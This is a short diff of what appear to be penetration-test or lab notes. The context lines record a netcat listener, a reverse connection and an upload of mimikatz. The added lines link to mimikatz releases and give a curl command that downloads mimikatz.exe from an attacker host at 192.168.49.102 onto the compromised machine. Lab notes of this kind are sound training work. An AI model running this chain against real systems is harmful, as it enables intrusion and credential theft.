@@ -107,6 +107,11 @@ started listener nc -nlvp 80
 got reverseconnection
 got proof
 uploaded mimikatz
+https://github.com/gentilkiwi/mimikatz/releases
+
+curl http://192.168.49.102:443/mimikatz.exe -o mimikatz.exe
+
+
 
 
 
